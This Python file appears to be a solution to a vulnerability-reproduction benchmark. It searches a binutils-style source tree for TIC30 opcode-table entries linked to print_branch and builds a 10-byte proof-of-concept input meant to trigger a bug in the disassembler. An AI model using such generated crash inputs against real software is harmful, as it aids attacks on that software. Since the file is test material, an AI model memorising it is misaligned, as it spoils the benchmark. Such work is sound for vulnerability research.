import os
import re
import tarfile
import tempfile
from typing import Optional, Tuple, List


def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
    def is_within_directory(directory: str, target: str) -> bool:
        abs_directory = os.path.abspath(directory)
        abs_target = os.path.abspath(target)
        return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])

    with tarfile.open(tar_path, "r:*") as tar:
        members = tar.getmembers()
        for m in members:
            target_path = os.path.join(dst_dir, m.name)
            if not is_within_directory(dst_dir, target_path):
                continue
            if m.isdev():
                continue
            tar.extract(m, dst_dir)


def _read_text_file(path: str, max_bytes: int = 4_000_000) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(max_bytes)
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _find_file(root: str, basename: str) -> Optional[str]:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn == basename:
                return os.path.join(dirpath, fn)
    return None


def _find_files_with_substring(root: str, substr: str, exts: Tuple[str, ...] = (".c", ".h")) -> List[str]:
    out = []
    s = substr
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if not fn.endswith(exts):
                continue
            p = os.path.join(dirpath, fn)
            try:
                with open(p, "rb") as f:
                    chunk = f.read(200_000)
                if s.encode() in chunk:
                    out.append(p)
            except Exception:
                continue
    return out


def _guess_insn_size_from_disassembler(dis_text: str) -> int:
    # Try to find print_insn_* returning 4 or 2.
    # Heuristic: locate "print_insn" function and see most common 'return N;'
    returns = re.findall(r"\breturn\s+([24])\s*;", dis_text)
    if not returns:
        return 4
    c2 = returns.count("2")
    c4 = returns.count("4")
    return 2 if c2 > c4 else 4


def _parse_entry_numbers(segment: str) -> Optional[Tuple[str, int, int]]:
    mnem_m = re.search(r'"([^"]+)"', segment)
    if not mnem_m:
        return None
    mnem = mnem_m.group(1)
    rest = segment[mnem_m.end():]
    nums = re.findall(r"(0x[0-9A-Fa-f]+|\d+)", rest)
    if len(nums) < 2:
        return None
    a = int(nums[0], 0)
    b = int(nums[1], 0)
    return mnem, a & 0xFFFFFFFF, b & 0xFFFFFFFF


def _select_mask_value(a: int, b: int) -> Optional[Tuple[int, int]]:
    # Determine which is value and which is mask.
    # mask usually has more bits set; must satisfy (value & mask) == value.
    def ok(val: int, msk: int) -> bool:
        return (val & msk) == val

    a_bits = a.bit_count()
    b_bits = b.bit_count()

    cand = []
    if ok(a, b):
        cand.append((b_bits, b, a))  # (maskbits, mask, value)
    if ok(b, a):
        cand.append((a_bits, a, b))
    if not cand:
        return None
    cand.sort(reverse=True)
    _, mask, value = cand[0]
    if mask == 0:
        return None
    return mask & 0xFFFFFFFF, value & 0xFFFFFFFF


def _extract_entries_with_print_branch(text: str) -> List[Tuple[str, int, int]]:
    out = []
    idx = 0
    while True:
        pos = text.find("print_branch", idx)
        if pos < 0:
            break
        start = text.rfind("{", 0, pos)
        end = text.find("}", pos)
        if start >= 0 and end >= 0 and end > start and (end - start) < 800:
            seg = text[start:end + 1]
            parsed = _parse_entry_numbers(seg)
            if parsed:
                out.append(parsed)
        idx = pos + 11
    return out


def _extract_opcode_table_candidates(text: str) -> List[Tuple[str, int, int]]:
    # Generic opcode entry: { "mnem", num, num, ... }
    out = []
    for m in re.finditer(r'\{\s*"([^"]+)"\s*,\s*(0x[0-9A-Fa-f]+|\d+)\s*,\s*(0x[0-9A-Fa-f]+|\d+)', text):
        mnem = m.group(1)
        a = int(m.group(2), 0) & 0xFFFFFFFF
        b = int(m.group(3), 0) & 0xFFFFFFFF
        out.append((mnem, a, b))
    return out


def _is_branch_mnemonic(mnem: str) -> bool:
    s = mnem.strip().lower()
    if s in {"b", "br", "bra", "jmp", "call", "ret", "db", "dbnz", "dj", "j", "jr"}:
        return True
    if s.startswith(("b", "br", "bra", "call", "jmp", "ret")):
        return True
    if "branch" in s:
        return True
    return False


def _choose_insn_word_from_sources(root: str) -> Optional[int]:
    # Prefer entries explicitly referencing print_branch.
    candidate_files = _find_files_with_substring(root, "print_branch", (".c", ".h"))
    for p in candidate_files:
        text = _read_text_file(p)
        for mnem, a, b in _extract_entries_with_print_branch(text):
            mv = _select_mask_value(a, b)
            if not mv:
                continue
            mask, value = mv
            insn = (value | (~mask & 0xFFFFFFFF)) & 0xFFFFFFFF
            if (insn & mask) == value:
                return insn

    # Otherwise try opcode tables and select a likely branch mnemonic.
    table_files = _find_files_with_substring(root, "tic30_opcodes", (".c", ".h")) or _find_files_with_substring(root, "opcodes", (".c", ".h"))
    best = None  # (maskbits, insn)
    for p in table_files:
        text = _read_text_file(p)
        for mnem, a, b in _extract_opcode_table_candidates(text):
            if not _is_branch_mnemonic(mnem):
                continue
            mv = _select_mask_value(a, b)
            if not mv:
                continue
            mask, value = mv
            insn = (value | (~mask & 0xFFFFFFFF)) & 0xFFFFFFFF
            if (insn & mask) != value:
                continue
            mb = mask.bit_count()
            if best is None or mb > best[0]:
                best = (mb, insn)
    if best:
        return best[1]

    # Fall back to a high-entropy word that might hit a branch decode.
    return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None
        root = src_path
        try:
            if os.path.isfile(src_path):
                tmpdir = tempfile.TemporaryDirectory()
                _safe_extract_tar(src_path, tmpdir.name)
                root = tmpdir.name

            dis_path = _find_file(root, "tic30-dis.c")
            insn_size = 4
            if dis_path:
                dis_text = _read_text_file(dis_path)
                insn_size = _guess_insn_size_from_disassembler(dis_text)

            insn = _choose_insn_word_from_sources(root)
            if insn is None:
                return b"\xFF" * 10

            if insn_size == 2:
                w16 = insn & 0xFFFF
                be = w16.to_bytes(2, "big", signed=False)
                le = w16.to_bytes(2, "little", signed=False)
                poc = be + le + (b"\xFF" * 6)
                return poc[:10] if len(poc) >= 10 else poc.ljust(10, b"\xFF")
            else:
                be = insn.to_bytes(4, "big", signed=False)
                le = insn.to_bytes(4, "little", signed=False)
                poc = be + le + b"\xFF\xFF"
                return poc[:10] if len(poc) >= 10 else poc.ljust(10, b"\xFF")
        finally:
            if tmpdir is not None:
                try:
                    tmpdir.cleanup()
                except Exception:
                    pass